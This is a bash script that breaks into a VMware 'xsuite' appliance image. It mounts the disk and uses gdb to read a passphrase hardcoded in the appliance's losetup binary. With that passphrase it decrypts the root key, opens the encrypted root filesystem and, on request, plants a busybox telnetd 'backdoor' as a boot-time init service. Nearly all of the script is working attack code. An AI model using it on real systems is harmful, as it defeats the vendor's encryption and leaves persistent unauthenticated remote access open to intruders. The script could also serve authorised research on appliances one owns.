#!/bin/bash

VMDK="/data/virtuals/xsuite/xsuite-2.4.4.9-disk1.vmdk"
FLATDISK='/data/virtuals/xsuite/disk/'
DM_DEVNAME='xsuite2-root'
MNT_ROOT='/data/virtuals/xsuite/ROOT'
MNT_BOOT='/data/virtuals/xsuite/BOOT'
ROOTKEY="${MNT_BOOT}/rootkey.gpg"

echo -n "## VMware FLAT disk mount.." 
vmware-mount -f ${VMDK} ${FLATDISK} && printf "%45.40s\n" "[ OK ]"
vmware-mount -L ; echo " "

SECTOR_SIZE="$(fdisk -l ${VMDK}|grep 'Sector size'|awk '{print $4}')"
OFFSET_SDA1="$((${SECTOR_SIZE}*$(vmware-mount -p ${VMDK}| egrep '^ 1 '|awk '{print $2}')))" # 32256
OFFSET_SDA2="$((${SECTOR_SIZE}*$(vmware-mount -p ${VMDK}| egrep '^ 2 '|awk '{print $2}')))" # 8422686720

echo -n "## creating nodes.."
# sda1 -> /dev/loop1 (encrypted rootfs)
losetup -o ${OFFSET_SDA1} /dev/loop1 ${FLATDISK}/flat && printf "%7.6s" "sda1" && printf "%46.40s\n" "[ OK ]"
# sda2 -> /dev/loop2 (/boot)
losetup -o ${OFFSET_SDA2} /dev/loop2 ${FLATDISK}/flat && printf "%26.6s" "sda2" && printf "%46.40s\n" "[ OK ]"
losetup -a ; echo " "

echo -n "## Mounting /boot.." ; mount /dev/loop2 ${MNT_BOOT} && printf "%53.6s\n" "[ OK ]"
mount |grep "${MNT_BOOT}" && echo " "

echo    "## Opening ELF binary ${MNT_BOOT}/losetup symbol table"
echo -n "## looking up for .data.08055700: .symtab.xsuite_password"
PASSPHRASE="$(gdb -q -ex 'x/s 0x8055700' -ex quit ${MNT_BOOT}/losetup |grep xsuite_password|awk '{print $3}'|sed 's/^"//;s/"$//')" && printf "%15.6s\n" "[ OK ]"
echo "Passphrase to decrypt key ${ROOTKEY}"
echo "is .. ${PASSPHRASE}"

TMP_ROOTKEY="$(tempfile)"
cp "${ROOTKEY}" "${TMP_ROOTKEY}" && echo " "

# mount encrypted rootfs
echo -n "## Decrypting ROOTFS.."
echo "${PASSPHRASE}"|gpg -a -q --batch --passphrase-fd 0 -d ${TMP_ROOTKEY} | cryptsetup loopaesOpen /dev/loop1 ${DM_DEVNAME} --key-size 128 --key-file=- && printf "%50.6s\n" "[ OK ]" && cryptsetup status ${DM_DEVNAME} 

echo -n "## Mounting rootfs.." ; mount /dev/mapper/${DM_DEVNAME} ${MNT_ROOT}  && printf "%52.6s\n" "[ OK ]"
mount |grep "${MNT_ROOT}"

rm -f -- "${TMP_ROOTKEY}"

read -r -p "Install busybox TELNETD backdoor? [Y/n]  [Enter] means No" response
response=${response,,} # tolower
if [[ $response =~ ^(yes|y| ) ]]; then
	if [ ! -f ${MNT_ROOT}/bin/busybox ]; then
	    cp /bin/busybox ${MNT_ROOT}/bin/
	fi
	
	if [ ! -f /etc/init.d/busybox-telnet ]; then
	    cp busybox-debian-init.sh ${MNT_ROOT}/etc/init.d/busybox-telnet
	    chmod 755 ${MNT_ROOT}/etc/init.d/busybox-telnet
	    ln -s ../init.d/busybox-telnet ${MNT_ROOT}/etc/rc2.d/S66busybox-telnet
	    ln -s ../init.d/busybox-telnet ${MNT_ROOT}/etc/rc0.d/K66busybox-telnet
	fi
fi
